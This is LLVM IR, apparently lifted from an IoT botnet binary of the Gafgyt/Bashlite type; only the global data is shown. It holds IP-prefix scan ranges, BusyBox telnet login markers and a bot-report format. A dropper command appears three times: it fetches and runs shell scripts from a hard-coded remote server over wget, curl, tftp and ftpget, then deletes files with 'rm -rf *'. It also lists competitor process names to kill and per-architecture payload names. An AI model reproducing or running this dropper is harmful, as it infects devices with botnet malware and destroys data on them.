source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805f3d4.2 = global i32 0
@global_var_805f404.3 = local_unnamed_addr global i32* @global_var_805f3d4.2
@global_var_805e3c4.4 = constant i32 0
@global_var_805f3d8.6 = local_unnamed_addr global i32 0
@global_var_805f8e0.7 = global i32 0
@global_var_805f8e4.8 = local_unnamed_addr global i32 0
@global_var_805f8e8.9 = local_unnamed_addr global i32 0
@global_var_805f598.10 = local_unnamed_addr global i32 4095
@global_var_805f594.11 = local_unnamed_addr global i32 362436
@global_var_8058332.12 = constant [7 x i8] c"(null)\00"
@global_var_8058339.14 = constant [3 x i8] c"-c\00"
@global_var_805833c.15 = constant [3 x i8] c"sh\00"
@global_var_805833f.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8058360.17 = constant i32 -1
@global_var_8058760.18 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_805876e.19 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_805f8c0.20 = local_unnamed_addr global i32 0
@global_var_8058777.21 = constant [5 x i8] c"PING\00"
@global_var_805877c.22 = constant [14 x i8] c"gethostbyname\00"
@global_var_805f8c8.23 = local_unnamed_addr global i32 0
@global_var_805f8cc.24 = local_unnamed_addr global i32 0
@global_var_8065b54.25 = local_unnamed_addr global i32 0
@global_var_805878a.26 = constant [6 x i8] c":>%$#\00"
@global_var_8058791.31 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_805879d.32 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_80587ab.33 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_80587b6.34 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_80587c3.35 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_80587ce.36 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_80587db.37 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_80587e7.38 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_80587f4.39 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_8058801.40 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_805880e.41 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_805881c.42 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_8058827.43 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_8058834.44 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_8058841.45 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_805884e.46 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_805885b.47 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_8058868.48 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_8058875.49 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_8058882.50 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_805888d.51 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_8058899.52 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_80588a6.53 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_80588b1.54 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_80588bc.55 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_80588c8.56 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_80588d4.57 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_80588e0.58 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_80588ed.59 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_80588fa.60 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_8058906.61 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_8058913.62 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_805891f.63 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_805892a.64 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_8058936.65 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_8058942.66 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_805894e.67 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_805895a.68 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_8058966.69 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_8058973.70 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_8058980.71 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_805898d.72 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_805899a.73 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_80589a7.74 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_80589b4.75 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_80589c1.76 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_80589ce.77 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_80589db.78 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_80589e8.79 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_80589f5.80 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_8058a03.81 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_8058a10.82 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_8058a1e.83 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_8058a2b.84 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_8058a39.85 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_8058a47.86 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_8058a54.87 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_8058a61.88 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_8058a6e.89 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_8058a7b.90 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_8058a88.91 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_8058a95.92 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_8058aa2.93 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_8058aaf.94 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_8058abc.95 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_8058ac9.96 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_8058ad6.97 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_8058ae3.98 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_8058af0.99 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_8058afd.100 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_8058b0a.101 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_8058b17.102 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_8058b24.103 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_8058b31.104 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_8058b3e.105 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_8058b4b.106 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_8058b58.107 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_8058b65.108 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_8058b72.109 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_8058b7f.110 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_8058b8c.111 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_8058b99.112 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_8058ba6.113 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_8058bb3.114 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_8058bc0.115 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_8058bcd.116 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_8058bda.117 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_8058be7.118 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_8058bf4.119 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_8058c01.120 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_8058c0e.121 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_8058c1b.122 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_8058c28.123 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_8058c35.124 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_8058c42.125 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_8058c4f.126 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_8058c5c.127 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_8058c69.128 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_8058c76.129 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_8058c82.130 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_8058c8f.131 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_8058c9c.132 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_8058ca9.133 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_8058cb5.134 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_8058cc2.135 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_8058cd0.136 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_8058cde.137 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_8058ceb.138 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_8058cf9.139 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_8058d07.140 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_8058d14.141 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_8058d22.142 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_8058d2f.143 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_8058d3c.144 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_8058d4a.145 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_8058d58.146 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_8058d66.147 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_8058d74.148 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_8058d81.149 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_8058d8d.150 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_8058d9b.151 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_8058da9.152 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_8058db7.153 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_8058dc5.154 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_8058dd3.155 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_8058de1.156 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_8058def.157 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_8058dfd.158 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_8058e0b.159 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_8058e19.160 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_8058e27.161 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_8058e35.162 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_8058e42.163 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_8058e4f.164 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_8058e5c.165 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_8058e69.166 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_8058e76.167 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_8058e83.168 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_8058e91.169 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_8058e9f.170 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_8058ead.171 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_8058eba.172 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_8058ec7.173 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_8058ed5.174 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_8058ee3.175 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_8058ef1.176 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_8058efe.177 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_8058f0b.178 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_8058f18.179 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_8058f25.180 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_8058f32.181 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_8058f3e.182 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_8058f4c.183 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_8058f59.184 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_8058f67.185 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_8058f75.186 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_8058f83.187 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_8058f90.188 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_8058f9e.189 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_8058fac.190 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_8058fba.191 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_8058fc8.192 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_8058fd6.193 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_8058fe4.194 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_8058ff1.195 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_8058fff.196 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_805900d.197 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_805901b.198 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_8059028.199 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_8059035.200 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_8059042.201 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_805904f.202 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_805905c.203 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_8059069.204 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_8059076.205 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_8059084.206 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_8059092.207 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_80590a0.208 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_80590ae.209 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_80590bc.210 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_80590ca.211 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_80590d7.212 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_80590e4.213 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_80590f2.214 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_8059100.215 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_805910e.216 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_805911c.217 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_805912a.218 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_8059138.219 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_8059146.220 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_8059154.221 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_8059161.222 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_805916e.223 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_805917b.224 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_8059188.225 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_8059195.226 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_80591a2.227 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_80591b0.228 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_805f5a0.229 = global i32 110
@global_var_80591bd.231 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_8058323.233 = constant [8 x i8] c"BusyBox\00"
@global_var_805832b.234 = constant i32 2293796
@global_var_805832d.235 = constant i32 595460131
@global_var_805832f.236 = constant [3 x i8] c"~#\00"
@global_var_805f540.237 = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058323.233, i32 0, i32 0), i8* bitcast (i32* @global_var_805832b.234 to i8*), i8* bitcast (i32* @global_var_805832d.235 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805832f.236, i32 0, i32 0)]
@global_var_80582f7.238 = constant [7 x i8] c"nvalid\00"
@global_var_80582fe.239 = constant [6 x i8] c"ailed\00"
@global_var_8058304.240 = constant [9 x i8] c"ncorrect\00"
@global_var_805830d.241 = constant [6 x i8] c"enied\00"
@global_var_8058313.242 = constant [5 x i8] c"rror\00"
@global_var_8058318.243 = constant [7 x i8] c"oodbye\00"
@global_var_805831f.244 = constant [4 x i8] c"bad\00"
@global_var_805f520.245 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80582f7.238, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80582fe.239, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058304.240, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805830d.241, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058313.242, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058318.243, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805831f.244, i32 0, i32 0)]
@global_var_805f4fc = external global i32
@global_var_80591c9.250 = constant [3 x i8] c"\0D\0A\00"
@global_var_805f560.251 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80582f7.238, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80582fe.239, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058304.240, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805830d.241, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058313.242, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058318.243, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805831f.244, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058323.233, i32 0, i32 0), i8* bitcast (i32* @global_var_805832b.234 to i8*), i8* bitcast (i32* @global_var_805832d.235 to i8*)]
@global_var_80591cc.252 = constant i32 993024795
@global_var_8059238.253 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_8058020.254 = constant [703 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_805f4f8.255 = local_unnamed_addr global [703 x i8]* @global_var_8058020.254
@global_var_8059270.257 = constant [711 x i8] c"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A x00\00"
@global_var_8059538.258 = constant [704 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_805aebc.259 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_805aecb.260 = constant [6 x i8] c"/tmp/\00"
@global_var_805aed1.261 = constant [6 x i8] c"/var/\00"
@global_var_805aed7.262 = constant [6 x i8] c"/dev/\00"
@global_var_805aedd.263 = constant [10 x i8] c"/var/run/\00"
@global_var_805aee7.264 = constant [10 x i8] c"/dev/shm/\00"
@global_var_805aef1.265 = constant [6 x i8] c"/mnt/\00"
@global_var_805aef7.266 = constant [7 x i8] c"/boot/\00"
@global_var_805aefe.267 = constant [6 x i8] c"/usr/\00"
@global_var_805af20.268 = constant [9 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805aebc.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aecb.260, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aed1.261, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aed7.262, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805aedd.263, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805aee7.264, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aef1.265, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aef7.266, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aefe.267, i32 0, i32 0)]
@global_var_805a3c4.269 = constant [5 x i8] c"wget\00"
@global_var_805a3c9.270 = constant [6 x i8] c"armv*\00"
@global_var_8059846.271 = constant [5 x i8] c"bot*\00"
@global_var_805a3cf.272 = constant [6 x i8] c"ntpd*\00"
@global_var_8059856.273 = constant [7 x i8] c"hackz*\00"
@global_var_805a3d5.274 = constant [8 x i8] c"shitty*\00"
@global_var_805a3dd.275 = constant [6 x i8] c"jack*\00"
@global_var_8059826.276 = constant [6 x i8] c"mips*\00"
@global_var_805980e.277 = constant [5 x i8] c"sex*\00"
@global_var_805a3e3.278 = constant [4 x i8] c"i86\00"
@global_var_805a3e7.279 = constant [5 x i8] c"ssh*\00"
@global_var_8059841.280 = constant [5 x i8] c"sh4*\00"
@global_var_805984b.281 = constant [11 x i8] c"jackmeoff*\00"
@global_var_8059813.282 = constant [6 x i8] c"tftp*\00"
@global_var_805a3ec.283 = constant [4 x i8] c"i56\00"
@global_var_805a3f0.284 = constant [5 x i8] c"mips\00"
@global_var_805a3f5.285 = constant [7 x i8] c"mipsel\00"
@global_var_805a3fc.286 = constant [4 x i8] c"sh4\00"
@global_var_805a400.287 = constant [4 x i8] c"x86\00"
@global_var_805a404.288 = constant [5 x i8] c"i686\00"
@global_var_805a409.289 = constant [4 x i8] c"ppc\00"
@global_var_805a40d.290 = constant [5 x i8] c"i586\00"
@global_var_805a412.291 = constant [7 x i8] c"mips64\00"
@global_var_805a419.292 = constant [6 x i8] c"sh2eb\00"
@global_var_805a41f.293 = constant [7 x i8] c"sh2elf\00"
@global_var_805a426.294 = constant [4 x i8] c"arm\00"
@global_var_805a42a.295 = constant [6 x i8] c"armv5\00"
@global_var_805a430.296 = constant [8 x i8] c"armv4tl\00"
@global_var_805a438.297 = constant [6 x i8] c"armv4\00"
@global_var_805a43e.298 = constant [6 x i8] c"armv6\00"
@global_var_805a444.299 = constant [8 x i8] c"powerpc\00"
@global_var_805a44c.300 = constant [13 x i8] c"powerpc440fp\00"
@global_var_805a459.301 = constant [5 x i8] c"m68k\00"
@global_var_805a45e.302 = constant [6 x i8] c"sparc\00"
@global_var_805a464.303 = constant [7 x i8] c"x86_64\00"
@global_var_805a46b.304 = constant [11 x i8] c"jackmymips\00"
@global_var_805a476.305 = constant [13 x i8] c"jackmymips64\00"
@global_var_805a483.306 = constant [13 x i8] c"jackmymipsel\00"
@global_var_805a490.307 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_805a49c.308 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_805a4a9.309 = constant [10 x i8] c"jackmysh4\00"
@global_var_805a4b3.310 = constant [10 x i8] c"jackmyx86\00"
@global_var_805a4bd.311 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_805a4c9.312 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_805a4d7.313 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_805a4e3.314 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_805a4ef.315 = constant [11 x i8] c"jackmyi686\00"
@global_var_805a4fa.316 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_805a508.317 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_805a51b.318 = constant [11 x i8] c"jackmyi586\00"
@global_var_805a526.319 = constant [11 x i8] c"jackmym68k\00"
@global_var_805a531.320 = constant [12 x i8] c"jackmysparc\00"
@global_var_805a53d.321 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_805a54a.322 = constant [11 x i8] c"hackmymips\00"
@global_var_805a555.323 = constant [13 x i8] c"hackmymips64\00"
@global_var_805a562.324 = constant [13 x i8] c"hackmymipsel\00"
@global_var_805a56f.325 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_805a57b.326 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_805a588.327 = constant [10 x i8] c"hackmysh4\00"
@global_var_805a592.328 = constant [10 x i8] c"hackmyx86\00"
@global_var_805a59c.329 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_805a5a8.330 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_805a5b6.331 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_805a5c2.332 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_805a5ce.333 = constant [11 x i8] c"hackmyi686\00"
@global_var_805a5d9.334 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_805a5e7.335 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_805a5fa.336 = constant [11 x i8] c"hackmyi586\00"
@global_var_805a605.337 = constant [11 x i8] c"hackmym68k\00"
@global_var_805a610.338 = constant [12 x i8] c"hackmysparc\00"
@global_var_805a61c.339 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_805a629.340 = constant [3 x i8] c"b1\00"
@global_var_805a62c.341 = constant [3 x i8] c"b2\00"
@global_var_805a62f.342 = constant [3 x i8] c"b3\00"
@global_var_805a632.343 = constant [3 x i8] c"b4\00"
@global_var_805a635.344 = constant [3 x i8] c"b5\00"
@global_var_805a638.345 = constant [3 x i8] c"b6\00"
@global_var_805a63b.346 = constant [3 x i8] c"b7\00"
@global_var_805a63e.347 = constant [3 x i8] c"b8\00"
@global_var_805a641.348 = constant [3 x i8] c"b9\00"
@global_var_805a644.349 = constant [4 x i8] c"b10\00"
@global_var_805a648.350 = constant [4 x i8] c"b11\00"
@global_var_805a64c.351 = constant [4 x i8] c"b12\00"
@global_var_805a650.352 = constant [4 x i8] c"b13\00"
@global_var_805a654.353 = constant [4 x i8] c"b14\00"
@global_var_805a658.354 = constant [4 x i8] c"b15\00"
@global_var_805a65c.355 = constant [4 x i8] c"b16\00"
@global_var_805a660.356 = constant [4 x i8] c"b17\00"
@global_var_805a664.357 = constant [4 x i8] c"b18\00"
@global_var_805a668.358 = constant [4 x i8] c"b19\00"
@global_var_805a66c.359 = constant [4 x i8] c"b20\00"
@global_var_805a670.360 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_805a681.361 = constant [9 x i8] c"DFhxdhdf\00"
